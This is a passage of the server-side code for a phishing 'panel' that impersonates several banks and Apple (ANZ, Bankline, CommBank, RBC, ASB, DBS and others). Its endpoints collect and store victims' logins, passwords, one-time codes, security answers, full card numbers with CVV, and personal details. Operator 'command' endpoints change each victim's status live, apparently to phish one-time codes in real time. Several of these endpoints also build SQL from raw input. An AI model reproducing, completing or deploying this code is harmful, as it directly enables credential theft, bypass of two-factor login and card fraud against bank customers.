  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid];
  let query = `UPDATE customers SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSaveEmail", cors());

app.post("/dbsSaveEmail", cors(), (req, res) => {
  email = req.body.email;
  uniqueid = req.body.uniqueid;

  let details = [email, uniqueid];
  let query = `UPDATE customers SET email=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSavePhoneOtp", cors());

app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSaveEmailOtp", cors());

app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE customers SET otp=?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSaveCC", cors());

app.post("/dbsSaveCC", cors(), (req, res) => {
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  uniqueid = req.body.uniqueid;

  let details = [ccnum, ccexp, cccvv, uniqueid];
  let query = `UPDATE customers SET ccnum=?, ccexp=?, cccvv=?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//ANZ
//ANZ
//ANZ

app.options("/anzCustomers/:owner", cors());

app.get("/anzCustomers/:owner", (req, res) => {
  owner = req.params.owner;

  let details = [owner];
  let query = `SELECT * FROM anz WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/anzCommand", cors());

app.post("/anzCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 4) {
    question1 = req.body.question1;

    let query = `UPDATE anz SET status= ${newStatus}, question1 = '${question1}' WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let query = `UPDATE anz SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.options("/anzCustomers/:id/:owner/modal", cors());

app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/anzCustomers/:id/:owner", cors());

app.get("/anzCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM anz WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/anzSaveLogin", cors());

app.post("/anzSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, ip, owner];
  let query = `INSERT INTO anz(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/anzSaveTelephone", cors());

app.post("/anzSaveTelephone", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE anz SET telephone=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/anzSaveLoginAgain", cors());

app.post("/anzSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, owner];
  let query = `UPDATE anz SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/anzSaveOTP", cors());

app.post("/anzSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE anz SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/anzSaveAnswers", cors());

app.post("/anzSaveAnswers", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  answer1 = req.body.answer1;
  owner = req.body.owner;

  let details = [answer1, uniqueid, owner];
  let query = `UPDATE anz SET answer1=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/anzDeleteentry/:id", cors());

app.post("/anzDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM anz WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BL
//BL
//BL

app.options("/banklineCustomers/:id", cors());

app.get("/banklineCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/banklineCustomers", cors());

app.get("/banklineCustomers", (req, res) => {
  blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/banklineSaveLogin", cors());

app.post("/banklineSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [customerId, userId, uniqueid, ip];
  let query = `INSERT INTO customers(customerId,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/banklineSavePayment", cors());

app.post("/banklineSavePayment", cors(), (req, res) => {
  paymentCode = req.body.paymentCode;
  uniqueid = req.body.uniqueid;

  let details = [paymentCode, uniqueid];
  let query = `UPDATE customers SET paymentCode=?, status=5 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/banklineSaveAuth", cors());

app.post("/banklineSaveAuth", cors(), (req, res) => {
  responseCode = req.body.responseCode;
  password = req.body.password;
  uniqueid = req.body.uniqueid;

  let details = [responseCode, password, uniqueid];
  let query = `UPDATE customers SET responseCode=?, password=?, status=3 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/banklineCommand", cors());

app.post("/banklineCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 2 || newStatus == 11) {
    char1 = req.body.char1;
    char2 = req.body.char2;
    char3 = req.body.char3;
    loginQr = req.body.loginQr;
    let details = [newStatus, char1, char2, char3, loginQr, uniqueid];
    let query = `UPDATE customers SET status=?, char1=?, char2=?,char3=?, loginQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 4) {
    paymentQr = req.body.paymentQr;
    partNumber = req.body.partNumber;
    let details = [newStatus, partNumber, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, partNumber=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else if (newStatus == 12) {
    paymentQr = req.body.paymentQr;
    let details = [newStatus, paymentQr, uniqueid];
    let query = `UPDATE customers SET status=?, paymentQr=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    blConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.options("/banklineDeleteentry/:id", cors());

app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/banklineSaveLoginAgain", cors());

app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  userId = req.body.userId;
  uniqueid = req.body.uniqueid;

  let details = [customerId, password, uniqueid];
  let query = `UPDATE customers SET customerId=?, password=?, status=1 WHERE uniqueid=?`;

  blConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//WP
//WP
//WP

app.options("/wpCustomers/:id/:owner/modal", cors());

app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/wpCustomers/:owner", cors());

app.get("/wpCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM wp WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/wpCommand", cors());

app.post("/wpCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE wp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/wpCustomers/:id/:owner", cors());

app.get("/wpCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM wp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/wpSaveLogin", cors());

app.post("/wpSaveLogin", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [customerId, password, uniqueid, ip, owner];
  let query = `INSERT INTO wp(customerId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/wpSaveLoginAgain", cors());

app.post("/wpSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [customerId, password, uniqueid, owner];
  let query = `UPDATE wp SET customerId=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/wpSaveOTP", cors());

app.post("/wpSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE wp SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/wpSaveTelephone", cors());

app.post("/wpSaveTelephone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE wp SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/wpDeleteentry/:id", cors());

app.post("/wpDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM wp WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//COMMBANK
//COMMBANK
//COMMBANK

app.options("/cbCustomers/:owner", cors());

app.get("/cbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM cb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/cbCommand", cors());

app.post("/cbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE cb SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/cbCustomers/:id/:owner", cors());

app.get("/cbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  time = new Date().toUTCString();

  panelConnection.query(
    `UPDATE cb SET time = '${time}' WHERE uniqueid = ${uniqueid}`,
    (err) => {
      if (err) {
        console.log(err);
      }
    }
  );

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/cbCustomers/:id/:owner/modal", cors());

app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM cb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/cbSaveLogin", cors());

app.post("/cbSaveLogin", cors(), (req, res) => {
  clientNumber = req.body.clientNumber;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [clientNumber, password, uniqueid, ip, owner, time];
  let query = `INSERT INTO cb(clientNumber,password,uniqueid,status,ip, owner, time) VALUES (?,?,?,1,?,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/cbSaveLoginAgain", cors());

app.post("/cbSaveLoginAgain", cors(), (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  time = new Date().toUTCString();

  let details = [customerId, password, time, uniqueid, owner];
  let query = `UPDATE cb SET customerId=?, password=?, time = ?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/cbSaveOTP", cors());

app.post("/cbSaveOTP", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [otp, time, uniqueid, owner];
  let query = `UPDATE cb SET otp=?, time = ?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/cbSaveCard", cors());

app.post("/cbSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [ccnum, ccexp, cccvv, time, uniqueid, owner];
  let query = `UPDATE cb SET ccnum=?, ccexp=?, cccvv=?, time = ?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/cbSavePhone", cors());

app.post("/cbSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;
  time = new Date().toUTCString();

  let details = [telephone, time, uniqueid, owner];
  let query = `UPDATE cb SET telephone=?, time = ?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/cbDeleteentry/:id", cors());

app.post("/cbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM cb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//ZENCOM
//ZENCOM
//ZENCOM

app.options("/zcCustomers/:owner", cors());

app.get("/zcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let result = [];
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.options("/zcCommand", cors());

app.post("/zcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].status = newStatus;
      res.send("Update Completed");
    }
  }
});

app.options("/zcCustomers/:id/:owner", cors());

app.get("/zcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;
  let result = [];

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid && db.Zencom[i].owner === owner) {
      result.push(db.Zencom[i]);
    }
  }
  res.send(result);
});

app.options("/zcSavePin", cors());

app.post("/zcSavePin", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  pin = req.body.pin;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].pin = pin;
      db.Zencom[i].status = 5;
    }
  }
  res.send("Completed");
});

app.options("/zcSaveLoginAgain", cors());

app.post("/zcSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].telephone = telephone;
      db.Zencom[i].status = 1;
    }
  }
  res.send("Completed");
});

app.options("/zcSaveOtp", cors());

app.post("/zcSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  for (let i = 0; i < db.Zencom.length; i++) {
    if (db.Zencom[i].uniqueid === uniqueid) {
      db.Zencom[i].otp = otp;
      db.Zencom[i].status = 3;
    }
  }
  res.send("Completed");
});

app.options("/zcSaveLogin", cors());

app.post("/zcSaveLogin", cors(), (req, res) => {
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let loginInfo = {
    id: uniqueid,
    uniqueid: uniqueid,
    telephone: telephone,
    owner: owner,
    ip: ip,
    status: 1,
  };
  db.Zencom.push(loginInfo);
  res.send("Completed");
});

//RBC
//RBC
//RBC

app.options("/rbcCustomers/:id/:owner/modal", cors());

app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/rbcCustomers/:owner", cors());

app.get("/rbcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM rbc WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/rbcCommand", cors());

app.post("/rbcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query;
  if (newStatus === 5) {
    question = req.body.question;
    query = `UPDATE rbc SET status = ${newStatus}, question = ${question} WHERE uniqueid= '${uniqueid}'`;
  } else {
    query = `UPDATE rbc SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;
  }
  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/rbcCustomers/:id/:owner", cors());

app.get("/rbcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/rbcSaveLogin", cors());

app.post("/rbcSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  ip = req.body.ip;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO rbc(username,password,uniqueid,status,ip,owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/rbcSaveTelephone", cors());

app.post("/rbcSaveTelephone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;

  let details = [telephone, uniqueid];
  let query = `UPDATE rbc SET telephone= ?, status = 2 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/rbcSaveQuestion", cors());

app.post("/rbcSaveQuestion", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  answer = req.body.answer;

  let details = [answer, uniqueid];
  let query = `UPDATE rbc SET answer= ?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/rbcSaveOtp", cors());

app.post("/rbcSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;

  let details = [otp, uniqueid];
  let query = `UPDATE rbc SET otp= ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/rbcSaveLoginAgain", cors());

app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  username = req.body.username;
  password = req.body.password;

  let details = [username, password, uniqueid];
  let query = `UPDATE rbc SET username= ?, password= ?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/rbcDeleteentry/:id", cors());

app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM rbc WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//APPLE PANEL
//APPLE PANEL
//APPLE PANEL

app.options("/appleCustomers/:id/:owner/modal", cors());

app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/appleCustomers/:owner", cors());

app.get("/appleCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM apple WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/appleCommand", cors());

app.post("/appleCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE apple SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/appleCustomers/:id/:owner", cors());

app.get("/appleCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM apple WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/appleSaveBilling", cors());

app.post("/appleSaveBilling", cors(), (req, res) => {
  firstName = req.body.firstName;
  lastName = req.body.lastName;
  telephone = req.body.telephone;
  addy = req.body.addy;
  town = req.body.town;
  pcode = req.body.pcode;
  dob = req.body.dob;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [
    `${firstName} ${lastName}`,
    telephone,
    addy,
    town,
    pcode,
    dob,
    uniqueid,
    ip,
    owner,
  ];
  let query = `INSERT INTO apple(fullName,telephone, addy, city, pcode, dob, uniqueid,status,ip, owner) VALUES (?,?,?,?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/appleSaveCC", cors());

app.post("/appleSaveCC", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  owner = req.body.owner;

  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE apple SET ccname= ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/appleSaveOtp", cors());

app.post("/appleSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE apple SET otp= ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/appleDeleteentry/:id", cors());

app.post("/appleDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM apple WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//ASB
//ASB
//ASB

app.options("/asbCustomers/:id/:owner/modal", cors());

app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/asbCustomers/:owner", cors());

app.get("/asbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM asb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/asbCommand", cors());

app.post("/asbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE asb SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/asbCustomers/:id/:owner", cors());

app.get("/asbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM asb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/asbSaveLogin", cors());

app.post("/asbSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO asb(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
